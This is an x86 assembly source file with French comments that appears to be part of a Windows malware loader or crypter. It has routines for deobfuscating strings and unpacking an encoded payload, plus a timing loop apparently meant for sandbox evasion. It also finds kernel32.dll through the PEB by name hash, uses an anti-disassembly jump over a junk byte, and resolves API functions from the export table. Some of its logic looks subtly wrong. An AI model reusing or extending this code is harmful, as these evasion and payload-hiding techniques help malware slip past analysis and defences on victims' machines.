align 16
section .data
count dd 0;
%include "ostrings.inc"
dostring times  255 db 0x00

section .text
GLOBAL _startrand
GLOBAL _findkernel
GLOBAL _getfunction
GLOBAL _conv7to8
GLOBAL _ostring


; Deobfuscate a string 
_ostring:
	push ebp
	mov	ebp,esp
	; la string est en esp+4
	mov	edi, dostring
	mov esi,[ebp+8]  			; str_ntdll
	xor edx,edx
	mov	ecx,[allstroff]   ; offset srtings
.osloop
	xor eax,eax
	lodsb	; lis char
	test	al,al
	je	.ostringdone
	mov 	dl,al
	lodsb   ; 1
	shl	eax,2  ; x4
	mov	eax, [allstroff+eax]
  add eax,ecx
	mov al, [eax+edx-1]
	stosb
	jmp	.osloop

.ostringdone
	xor	eax,eax
	stosb	
	mov eax, dostring
	mov esp,ebp
	pop	ebp
  ret


_conv7to8
	 push	ebp
	mov		ebp,esp
	push	ebp
	push	ebx
	push	edi
	push	esi

	; src, dst  ; ebp+4 = esp
	mov	esi,[ebp+8] ; src
	mov	edi,[ebp+12] ; dst
	mov	ecx,[ebp+16] ; Len payload
	shr ecx,3 ; // len PAyload / 7
;	mov	dword [ebp+12],0
	mov dword [count],0

.conloopg
	push ecx

	xor ebx,ebx
	xor ecx,ecx
	mov	edx,5	

.conloop        ; les 5 source et genere un 32 bit
	xor	eax,eax
	lodsb
	shl eax,cl
	
	add	cl,7
	or 	ebx,eax
	dec	edx
	jnz .conloop	

	mov	eax,ebx
	stosd
; xxxxxxxx oooooooo xxxxxxxx oooooooo xxxxxxxx oooooooo xxxxxxxx
; xxxxxxx  xoooooo  ooxxxxx  xxxoooo  ooooxxx  xxxxxoo  oooooox  xxxxxxx 
; 0      7 8      1 1      2 2      2 2
;                 4 5      1 2      7 8 

	xor ebx,ebx
	dec	esi			; relis le 5eme
	xor	eax,eax
	lodsb
	shr	eax,4
	or 	ebx,eax
 
 	mov	cl,3
	mov	edx,3
.conloop2:
 	xor	eax,eax
	lodsb
	shl	eax,cl
	add cl,7
	or	ebx,eax
	dec edx
	jnz .conloop2

	mov	eax,ebx
	stosd
	dec	edi

	pop	ecx
	;add	dword [ebp+12],7
	add dword [count], 7
	loop	.conloopg

	mov		eax,dword [count] ;dword [ebp+12]
	pop		esi
	pop		edi
	pop		ebx
	mov		esp,ebp
	pop		ebp
	ret

; Demarrage ... space
_startrand:

rloop:
		rdtsc
		add	eax,edx
		and eax,0xffff
		cmp eax,0x0fff
		ja rloop

		mov eax,1 ; return True
		ret

; Trouve l'offset de Kernel 32.dll en memoire
_findkernel:
	push esi
	push edi
	push ebx
	push .here
	push byte 0x10
	pop eax
	add eax,0x10
	mov	edx,0x10
  cmp eax,0x20 		
	jne  .fake	  
	ret	
.fake:
	db 0xfe	
.here:
 ;int3
  mov edx, [fs:edx+eax]  ;  pointer sur PEB  fs:0x30
  mov eax,0x90909090 
	mov edx, [edx+0x0C]    ;  pointeur sur  PEB->Ldr
  mov edx, [edx+0x14]    ;  premier module de la liste InMemoryOrder 
next_module:
  mov esi, [edx+0x28]    ;  pointeur sur la liste (unicode)
  xor edi, edi           ;  edi = destination du hash
	mov ecx,12 * 2				 ;  taille de la string
loop_modulename:
  xor eax, eax           
  lodsb     						 ; read le byte du nom (word car unicode)
  cmp al,'Z'       ; conversion si besoin en majuscule
  jb  noupper
  sub al, 0x20           
noupper
  rol edi, 3       ; mov the hash
	xor edi,eax					; Hash du pauvre...   
  loop loop_modulename    ; dec ecx loop
	; 0xB39A1545 kernel32.dll ; msvcrt.dll, E3E945A3 kernel32.dll
	cmp edi, 0xB39A1545 ;  0x0E3E945A ;3   ; test le hash (on cherche  h KERNEL32.DLL
  je .found
	mov edx, [edx]         ; choppe le module suivant
  mov ebx, [edx+0x10]    ; module base address
	jmp next_module

.found:
	mov eax, [edx+0x10]         ; choppe le module suivant
	pop ebx
  pop edi
  pop esi	
  ret

; trouve une fonction dans kernel32.dll
_getfunction:
		push ebp
		mov	 ebp,esp
    push ebx
    push esi
    push edi
 	; esp+8 = KernelBase
	; esp+c = string
	; esp+10 = len


	mov		edi,[ebp+0xc] ; Calcul la taille de la string
	xor		eax,eax
	mov 	ecx,255
	repne scasb
	mov 	al,254
	sub 	al,cl
	xchg 	eax,ecx

	mov		eax,[ebp+0x8]
  mov 	ebx,eax
  mov 	edx,[eax+60] ; PE base loCATION
	add		eax, edx  
	mov 	edx,[eax] ; PE base dans EDX
  add 	eax, 0x78
	mov 	edx,[eax] ; Export Table offset
	add 	ebx,edx	 ;  edx = iat export table

  mov [ExpTable],ebx
  
	mov edx,[ebp+0xC]
;	mov ecx,[ebp+0x10]


section .data
  ExpTable		dd 0

section .text
 
    mov esi, [ExpTable]
    
		mov esi, [esi+0x20] ;RVA 
    add esi, [ebp+0x8]  ;VA 
    xor ebx,ebx
    cld
 
    myloop:
          inc ebx
          lodsd
          add eax , [ebp+0x8]   ;eax sur les string des fonctions
          push esi       ; save pour la prochane loop
          mov esi,eax
          mov edi,edx
          cld
          push ecx
          repe cmpsb ; String Match ?
          pop ecx
          pop esi
          jne myloop
 
          dec ebx
          mov eax,[ExpTable]
          mov eax,[eax+0x24]       ;RVA  EOT
          add eax,[ebp+0x8]     ;VA  EOT
          movzx eax , word [ebx*2+eax]  ;eax offset de la fonction
          mov ebx,[ExpTable]
          mov ebx,[ebx+0x1C]       ;RVA  EAT
          add ebx,[ebp+0x8]     ;VA  EAT
          mov ebx,[eax*4+ebx]
          add ebx,[ebp+0x8]
          mov eax,ebx
 
        pop edi
        pop esi
        pop ebx
				mov	esp,ebp
				pop	ebp
        ret
 
